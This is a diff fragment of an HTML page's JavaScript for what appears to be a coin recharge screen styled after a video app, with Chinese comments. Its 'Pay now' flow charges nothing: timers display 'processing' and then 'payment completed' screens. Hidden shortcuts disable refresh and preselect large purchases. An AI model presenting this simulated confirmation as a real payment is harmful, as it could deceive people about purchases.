+            let price = '$0.31';
+            
+            if (selectedOption && selectedOption.classList.contains('custom-option')) {
+                // 自定义选项
+                const customValue = customInput.value;
+                if (customValue) {
+                    coins = parseInt(customValue, 10).toLocaleString();
+                    price = totalAmount.textContent;
+                }
+            } else if (selectedOption) {
+                // 预设选项
+                const coinAmount = selectedOption.querySelector('.coin-amount span');
+                const coinPrice = selectedOption.querySelector('.coin-price');
+                if (coinAmount && coinPrice) {
+                    coins = coinAmount.textContent;
+                    price = coinPrice.textContent;
+                }
+            }
+            
+            // 保存当前硬币数量供支付完成弹窗使用
+            currentCoins = coins;
+            
+            // 更新弹窗内容
+            modalCoins.textContent = coins + ' Coins';
+            modalCoinsPrice.textContent = price;
+            modalTotalPrice.textContent = price;
+            modalFinalTotal.textContent = price.replace('$', '$ ');
+            
+            // 保存当前价格并更新支付按钮文本（手机视口下显示金额）
+            currentPrice = price;
+            updatePayButtonText(price);
+            
+            // 显示弹窗
+            orderModal.classList.add('active');
+            document.body.style.overflow = 'hidden'; // 禁止背景滚动
+        });
+
+        // 关闭弹窗
+        function closeOrderModal() {
+            orderModal.classList.remove('active');
+            document.body.style.overflow = ''; // 恢复背景滚动
+        }
+
+        closeModal.addEventListener('click', closeOrderModal);
+
+        // 点击背景关闭弹窗
+        orderModal.addEventListener('click', function(e) {
+            if (e.target === orderModal) {
+                closeOrderModal();
+            }
+        });
+
+        // Pay now 按钮点击
+        const processingModal = document.getElementById('processingModal');
+        const completedModal = document.getElementById('completedModal');
+        const goBackBtn = document.getElementById('goBackBtn');
+        const completedCoins = document.getElementById('completedCoins');
+        
+        let currentCoins = '30'; // 保存当前充值的硬币数量
+        
+        payNowBtn.addEventListener('click', function() {
+            // 关闭订单摘要弹窗
+            closeOrderModal();
+            
+            // 短暂延迟后显示支付处理弹窗
+            setTimeout(function() {
+                processingModal.classList.add('active');
+            }, 300);
+
+            // 2秒后关闭支付处理弹窗，显示支付完成弹窗
+            setTimeout(function() {
+                processingModal.classList.remove('active');
+                
+                // 再短暂延迟后显示支付完成弹窗
+                setTimeout(function() {
+                    // 更新支付完成弹窗中的硬币数量
+                    completedCoins.textContent = currentCoins + ' coins';
+                    completedModal.classList.add('active');
+                    
+                    // 1.5秒后自动关闭支付完成弹窗并重置页面内容
+                    setTimeout(function() {
+                        completedModal.classList.remove('active');
+                        document.body.style.overflow = '';
+                        // 清空用户名输入框
+                        usernameInput.value = '';
+                        
+                        // 重置金币选择到第一个选项
+                        coinOptions.forEach(opt => opt.classList.remove('selected'));
+                        coinOptions[0].classList.add('selected');
+                        
+                        // 重置总价为第一个选项的价格
+                        const defaultPrice = '$0.31';
+                        totalAmount.textContent = defaultPrice;
+                        updateButtonPrice(defaultPrice);
+                    }, 1500);
+                }, 300);
+            }, 2000);
+        });
+
+        // Go Back 按钮点击
+        goBackBtn.addEventListener('click', function() {
+            completedModal.classList.remove('active');
+            document.body.style.overflow = '';
+            // 清空用户名输入框
+            usernameInput.value = '';
+            
+            // 重置金币选择到第一个选项
+            coinOptions.forEach(opt => opt.classList.remove('selected'));
+            coinOptions[0].classList.add('selected');
+            
+            // 重置总价为第一个选项的价格
+            const defaultPrice = '$0.31';
+            totalAmount.textContent = defaultPrice;
+            updateButtonPrice(defaultPrice);
+        });
+
+        // Tab键切换金币选项的状态
+        let tabToggleState = 0; // 0表示将要切换到17500, 1表示将要切换到自定义
+        
+        // 键盘事件处理
+        document.addEventListener('keydown', function(e) {
+            // 禁用F5刷新
+            if (e.key === 'F5') {
+                e.preventDefault();
+                return false;
+            }
+            
+            // F2键聚焦到用户名输入框
+            if (e.key === 'F2' && !orderModal.classList.contains('active') && 
+                !processingModal.classList.contains('active') && 
+                !completedModal.classList.contains('active')) {
+                e.preventDefault();
+                usernameInput.focus();
+                usernameInput.select(); // 选中已有内容，方便直接输入
+                return false;
+            }
+            
+            // ESC键关闭订单弹窗
+            if (e.key === 'Escape' && orderModal.classList.contains('active')) {
+                closeOrderModal();
+            }
+            
+            // Tab键在主页面切换金币选项
+            if (e.key === 'Tab' && !orderModal.classList.contains('active') && 
+                !processingModal.classList.contains('active') && 
+                !completedModal.classList.contains('active')) {
+                e.preventDefault();
+                
+                // 移除所有选中状态
+                coinOptions.forEach(opt => opt.classList.remove('selected'));
+                
+                if (tabToggleState === 0) {
+                    // 选中17500金币（索引6）
+                    coinOptions[6].classList.add('selected');
+                    const price = '$180.99';
+                    totalAmount.textContent = price;
+                    updateButtonPrice(price);
+                    tabToggleState = 1;
+                } else {
+                    // 选中自定义金币（索引7）
+                    coinOptions[7].classList.add('selected');
+                    // 聚焦到自定义输入框
+                    customInput.focus();
+                    // 如果输入框有值，更新总价
+                    if (customInput.value) {
+                        const value = parseInt(customInput.value, 10);
+                        if (!isNaN(value)) {
+                            const price = '$' + (value * COIN_RATE).toFixed(2);
+                            totalAmount.textContent = price;
+                            updateButtonPrice(price);
+                        }
+                    } else {
+                        totalAmount.textContent = '$0.00';
+                        updateButtonPrice('$0.00');
+                    }
+                    tabToggleState = 0;
+                }
+            }
+            
+            // 回车键处理
+            if (e.key === 'Enter') {
+                // 如果支付完成弹窗打开，回车等同于点击 Go Back
+                if (completedModal.classList.contains('active')) {
+                    e.preventDefault();
+                    goBackBtn.click();
+                }
+                // 如果订单摘要弹窗打开，回车等同于点击 Pay now
+                else if (orderModal.classList.contains('active')) {
+                    e.preventDefault();
+                    payNowBtn.click();
+                }
+                // 如果没有弹窗打开，回车等同于点击 Recharge
+                else if (!processingModal.classList.contains('active')) {
+                    e.preventDefault();
+                    document.querySelector('.recharge-btn').click();
+                }
+            }
+        });
+
+        // ========== 自定义充值键盘弹窗逻辑 ==========
+        const customKeyboardModal = document.getElementById('customKeyboardModal');
+        const keyboardBackBtn = document.getElementById('keyboardBackBtn');
+        const keyboardCoinInput = document.getElementById('keyboardCoinInput');
+        const keyboardInputWrapper = document.getElementById('keyboardInputWrapper');
+        const keyboardTotalAmount = document.getElementById('keyboardTotalAmount');
+        const keyboardRechargeBtn = document.getElementById('keyboardRechargeBtn');
+        const keyboardKeys = document.querySelectorAll('.keyboard-key');
+
+        // 确保背景页面在顶部
+        function ensurePageTop() {
+            window.scrollTo(0, 0);
+            document.body.style.top = '0';
+        }
+
+        // 关闭键盘弹窗
+        function closeKeyboardModal() {
+            customKeyboardModal.classList.remove('active');
+            
+            // 恢复背景滚动
+            document.body.style.overflow = '';
+            document.body.style.position = '';
+            document.body.style.top = '';
+            document.body.style.width = '';
+        }
+
+        // 返回按钮
+        keyboardBackBtn.addEventListener('click', function() {
+            ensurePageTop();
+            closeKeyboardModal();
+        });
+
+        // 点击背景关闭弹窗
+        customKeyboardModal.addEventListener('click', function(e) {
+            if (e.target === customKeyboardModal) {
+                ensurePageTop();
+                closeKeyboardModal();
+            }
+        });
+
+        // 更新键盘弹窗的总价和按钮状态
+        function updateKeyboardTotal() {
+            const value = keyboardCoinInput.value.replace(/,/g, '');
+            if (!value || value === '') {
+                keyboardTotalAmount.textContent = '$0';
+                keyboardCoinInput.style.color = '#a0a0a0';
+                keyboardRechargeBtn.disabled = true;
+                return;
+            }
+
+            const numValue = parseInt(value, 10);
+            if (isNaN(numValue) || numValue < 30) {
+                keyboardTotalAmount.textContent = '$0';
+                keyboardCoinInput.style.color = '#a0a0a0';
+                keyboardRechargeBtn.disabled = true;
+                return;
+            }
+
+            // 只在桌面端限制最大值
+            let limitedValue = numValue;
+            if (!isMobileDevice()) {
+                limitedValue = Math.min(numValue, 2500000);
+            }
+            
+            // 计算价格
+            const price = (limitedValue * COIN_RATE).toFixed(2);
+            keyboardTotalAmount.textContent = '$' + price;
+            keyboardCoinInput.style.color = '#161823';
+            keyboardRechargeBtn.disabled = false;
+        }
+
+        // 格式化数字（添加千位分隔符）
+        function formatNumber(num) {
+            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+        }
+
+        // 处理键盘按键
+        keyboardKeys.forEach(key => {
+            key.addEventListener('click', function() {
+                // 确保页面在顶部
+                ensurePageTop();
+                
+                const value = this.getAttribute('data-value');
+                let currentValue = keyboardCoinInput.value.replace(/,/g, '');
+
+                if (value === 'delete') {
+                    // 在手机视口下，删除按钮清除所有数字
+                    if (isMobileDevice()) {
+                        currentValue = '';
+                    } else {
+                        // 桌面端删除最后一个字符
+                        if (currentValue.length > 0) {
+                            currentValue = currentValue.slice(0, -1);
+                        }
+                    }
+                } else {
+                    // 如果是第一个字符且输入的是0或000，则禁止输入
+                    if (currentValue.length === 0 && (value === '0' || value === '000')) {
+                        return;
+                    }
+                    
+                    // 添加数字
+                    currentValue += value;
+                    
+                    // 只在桌面端检查最大值限制
+                    if (!isMobileDevice()) {
+                        const numValue = parseInt(currentValue, 10);
+                        if (numValue > 2500000) {
+                            currentValue = '2500000';
+                        }
+                    }
+                }
+
+                // 更新输入框（添加千位分隔符）
+                if (currentValue) {
+                    keyboardCoinInput.value = formatNumber(currentValue);
+                } else {
+                    keyboardCoinInput.value = '';
+                }
+
+                // 更新总价
+                updateKeyboardTotal();
+            });
+        });
+
+        // Recharge按钮
+        keyboardRechargeBtn.addEventListener('click', function() {
+            // 确保页面在顶部
+            ensurePageTop();
+            
+            const value = keyboardCoinInput.value.replace(/,/g, '');
+            const numValue = parseInt(value, 10);
+
+            if (!value || isNaN(numValue) || numValue < 30) {
+                return;
+            }
+
+            // 更新主页面的custom输入框
+            customInput.value = numValue;
+            
+            // 更新主页面的总价
+            const price = '$' + (numValue * COIN_RATE).toFixed(2);
+            totalAmount.textContent = price;
+            updateButtonPrice(price);
+
+            // 关闭键盘弹窗
+            closeKeyboardModal();
+
+            // 获取用户名输入框的内容
+            const username = usernameInput.value.trim();
+            if (username) {
+                modalAccount.textContent = username;
+            } else {
+                modalAccount.textContent = 'user2044933...'; // 默认用户名
+            }
+
+            // 格式化金币数量（添加千位分隔符）
+            const coins = numValue.toLocaleString();
+            
+            // 保存当前硬币数量供支付完成弹窗使用
+            currentCoins = coins;
+            
+            // 更新弹窗内容
+            modalCoins.textContent = coins + ' Coins';
+            modalCoinsPrice.textContent = price;
+            modalTotalPrice.textContent = price;
+            modalFinalTotal.textContent = price.replace('$', '$ ');
+            
+            // 保存当前价格并更新支付按钮文本（手机视口下显示金额）
+            currentPrice = price;
+            updatePayButtonText(price);
+            
+            // 显示订单摘要弹窗
+            orderModal.classList.add('active');
+        });
+
+        // 输入框焦点样式
+        keyboardCoinInput.addEventListener('focus', function() {
+            keyboardInputWrapper.classList.add('focused');
+        });
+
+        keyboardCoinInput.addEventListener('blur', function() {
+            keyboardInputWrapper.classList.remove('focused');
+        });
+
+        // 当弹窗打开时重置输入
+        const originalAddClass = customKeyboardModal.classList.add;
+        customKeyboardModal.classList.add = function() {
+            originalAddClass.apply(this, arguments);
+            if (arguments[0] === 'active') {
+                // 重置输入
+                keyboardCoinInput.value = '';
+                keyboardTotalAmount.textContent = '$0';
+                keyboardCoinInput.style.color = '#a0a0a0';
+                keyboardRechargeBtn.disabled = true;
+            }
+        };
+    </script>
+</body>
+</html>
+
